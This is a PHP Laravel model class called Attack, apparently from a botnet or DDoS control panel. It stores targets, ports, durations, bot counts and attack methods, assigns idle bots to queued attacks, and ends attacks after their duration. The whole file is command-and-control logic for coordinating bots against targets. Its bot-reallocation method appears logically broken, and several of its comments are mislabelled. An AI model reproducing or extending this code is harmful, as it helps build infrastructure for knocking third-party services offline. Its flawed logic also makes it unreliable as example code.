<?php

namespace App;

use Illuminate\Database\Eloquent\Model;

use Carbon\Carbon;

use App\Bot;

class Attack extends Model
{
  /**
  * The attributes that are mass assignable.
  *
  * @var array
  */
  protected $fillable = ['name', 'target', 'port', 'start', 'finish', 'bots_number', 'duration'];


  /**
  * Mark attacks as finished when their number of minutes are disconncted
  */
  public static function stopFinished()
  {
    $attacks = Attack::running()->get();

    foreach ($attacks as $attack) {
      if ($attack->minutesFromStart() >= $attack->duration) {
        $attack->update(['finish' => Carbon::now()]);
      }
    }
  }

  /**
  * Check if attacking bots where disconnected, and reallocate them
  */
  public static function manageRunning()
  {
    $attacks = Attack::running()->get();

    foreach ($attacks as $attack) {
      if ($attack->bots_number < $attack->bots->count()) {
        while ($attack->bots_number < $attack->bots->count() and Bot::idle()->count() > 0 ) {
          $attack->bots()->save(Bot::idle()::first());
        }
      }
    }
  }

  /**
  * check waiting attack, and start when there is enough bots available
  */
  public static function startWaiting()
  {
    $attacks = Attack::waiting()->get();

    foreach ($attacks as $attack) {
      if (Bot::idle()->count() >= $attack->bots_number) {
        Bot::idle()->take($attack->bots_number)->update(['attack_id' => $attack->id]);
        $attack->update(['start' => Carbon::now()]);
      }
    }
  }

  /**
  * Scope a query to get only currently connected bots.
  *
  * @param \Illuminate\Database\Eloquent\Builder $query
  * @return \Illuminate\Database\Eloquent\Builder
  */
  public function scopeWaiting($query)
  {
    return $query->whereNull('start');
  }

  /**
  * Scope a query to get only currently connected bots.
  *
  * @param \Illuminate\Database\Eloquent\Builder $query
  * @return \Illuminate\Database\Eloquent\Builder
  */
  public function scopeRunning($query)
  {
    return $query->whereNotNull('start')->whereNull('finish');
  }

  /**
  * Scope a query to get only currently connected bots.
  *
  * @param \Illuminate\Database\Eloquent\Builder $query
  * @return \Illuminate\Database\Eloquent\Builder
  */
  public function scopeFinnished($query)
  {
    return $query->whereNotNull('start')->whereNotNull('finish');
  }

  /**
  * Get the bots allocated to the attack
  *
  * @return App\Bot;
  */
  public function bots()
  {
    return $this->hasMany('App\Bot');
  }

  /**
  * Get the user that create the attack.
  *
  * @return App\User;
  */
  public function user()
  {
   return $this->belongsTo('App\User');
  }

  /**
  * Get the attack's method.
  *
  * @return App\Method;
  */
  public function method()
  {
   return $this->belongsTo('App\Method');
  }

  /**
  * Get the user that create the attack.
  *
  * @return App\User;
  */
  public function minutesFromStart() {
    return Carbon::parse($this->start)->diffInMinutes(Carbon::now());
  }

  /**
  * return the current state of the attack
  *
  * @return String;
  */
  public function state() {
    if ($this->start and $this->finish) {
      return 'finished';
    } elseif ($this->start and !$this->finish) {
      return 'running';
    } else {
      return 'waiting';
    }
  }
}
